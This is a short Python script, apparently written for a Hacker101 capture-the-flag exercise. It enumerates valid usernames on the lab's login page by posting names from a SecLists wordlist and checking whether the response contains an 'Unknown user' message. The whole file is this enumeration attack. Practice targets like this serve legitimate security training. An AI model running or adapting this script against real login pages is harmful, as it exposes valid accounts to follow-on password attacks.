import requests

url = "https://c836f818cffb361d91a3a901515b1973.ctf.hacker101.com/login"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://c836f818cffb361d91a3a901515b1973.ctf.hacker101.com",
    "Referer": "https://c836f818cffb361d91a3a901515b1973.ctf.hacker101.com/login",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
}

l = []
with open("/home/Aymen/pentest-wordlists/SecLists-master/Usernames/top-usernames-shortlist.txt", "r", encoding="utf-8") as f:
    for username in f:
        username = username.strip()

        if not username:
            continue

        data = {
            "username": username,
            "password": "t",
        }

        response = requests.post(
            url,
            data=data,
            headers=headers
        )

        if ("Unknown user" in response.text):
            print(f"Invalid: {username}")            
        else:
            print(f"Valid: {username}")
            l.append(username)
print("VALID: ")
print(l)